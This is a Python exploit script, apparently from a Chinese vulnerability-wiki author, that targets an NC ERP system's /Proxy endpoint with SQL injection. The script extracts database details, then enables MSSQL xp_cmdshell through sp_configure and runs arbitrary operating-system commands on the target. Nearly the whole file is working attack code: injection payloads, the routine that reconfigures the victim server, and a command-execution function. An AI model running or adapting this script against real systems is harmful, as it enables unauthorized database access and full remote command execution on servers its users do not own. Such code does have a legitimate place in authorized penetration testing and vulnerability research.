#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import time
import requests
import re
import sys
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def POC_1(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    console.print(now_time() +  ' [INFO]     正在检测NC ERP是否存在注入漏洞',style='bold blue')
    check_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=check_url, headers=headers, data=data, timeout=10)
        row_1 = '<ROW COLUMN1="1"'
        row_2 = r'COLUMN2="(.*?)"'
        row_3 = r'COLUMN3="(.*?)"'
        row_4 = r'COLUMN4="(.*?)"'
        row_5 = r'COLUMN5="(.*?)"'
        if row_1 in response.text and "服务器错误信息：null" not in response.text:
            db_user = re.findall(row_2, response.text)[0]
            db_name = re.findall(row_3, response.text)[0]
            db_host = re.findall(row_4, response.text)[0]
            db_vers = re.findall(row_5, response.text)[0]
            console.print(now_time()+ " [SUCCESS]  该系统存在SQL漏洞，漏洞响应为:", style='bold green')
            console.print(now_time()+ " [INFO]     >> 数据库用户为:{}".format(db_user), style='bold green')
            console.print(now_time()+ " [INFO]     >> 数据库名为:{}".format(db_name), style='bold green')
            console.print(now_time()+ " [INFO]     >> 数据库主机名为:{}".format(db_host), style='bold green')
            console.print(now_time()+ " [INFO]     >> 数据库版本为:{}".format(db_vers), style='bold green')
            console.print(now_time()+ " [INFO]     该漏洞有可能可执行命令，请到移步到poc/nc_erp_sql.py进行检查确认\n", style='bold green')
            return db_name
        else:
            console.print(now_time()+" [WARNING]  该系统不存在目录遍历和任意文件读取", style='bold red')
    except:
        console.print(now_time()+" [WARNING]  无法该目标无法建立连接", style='bold red')

def xp_cmdshell_open(target_url, db_name):
    open_sql = ["use {}".format(db_name),"exec sp_configure 'show advanced options',1","reconfigure","exec sp_configure 'xp_cmdshell',1","reconfigure"]
    num = 1
    for sql in open_sql:
        open_url = target_url + "/Proxy"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">{}</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'.format(sql)
        try:
            console.print(now_time()+ " [INFO]     正在执行SQL语句:{}".format(sql), style='bold green')
            response = requests.post(url=open_url, headers=headers, data=data, timeout=10)
            num = num + 1
            if num == 5 :
                POC_2(target_url, db_name)

        except:
            console.print(now_time()+ " [INFO]     开启 xp_cmdsheall 失败", style='bold red')
            sys.exit(0)

def POC_2(target_url, db_name):
    db_name = db_name
    sql_cmd_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
    try:
        console.print(now_time()+ " [INFO]     正在执行SQL语句:exec xp_cmdshell 'whoami'",style='bold blue')
        response = requests.post(url=sql_cmd_url, headers=headers, data=data, timeout=10)
        if 'exec xp_cmdshell' in response.text:
            console.print(now_time()+ " [INFO]     数据库未开启 xp_cmdshell 模块", style='bold red')
            sqlcmd_open = str(input("\033[35m是否开启 xp_cmdshell\n(Y/N)   >>> \033[0m"))
            if sqlcmd_open == 'Y' or sqlcmd_open == 'y':
                xp_cmdshell_open(target_url, db_name)
            else:
                console.print(now_time()+ " [INFO]     停止开启 xp_cmdshell", style='bold bule')
                sys.exit(0)
        else:
            whoami = re.findall(r'output="(.*?)"', response.text)[0]
            console.print(now_time()+ " [SUCCESS]     成功执行SQL语句:exec xp_cmdshell 'whoami'>>> {}".format(whoami), style='bold green')

    except Exception as e:
        console.print(now_time()+ " [WARNING]     请求失败:{}".format(e), style='bold red')
        sys.exit(0)

def POC_3(target_url, cmd):
    vuln_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "{}"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'.format(cmd)
    try:
        console.print(now_time()+ " [INFO]     正在执行SQL语句:exec xp_cmdshell '{}'".format(cmd), style='bold blue')
        response = requests.post(url=vuln_url, headers=headers, data=data, timeout=20)

        data = re.findall(r'output="(.*?)"', response.text)
        for i in data:
            console.print(now_time()+ " [INFO]     >>> ".format(i), style='bold green')
    except Exception as e:
        console.print(now_time()+ " [INFO]     请求失败:{} ".format(e), style='bold red')
        sys.exit(0)

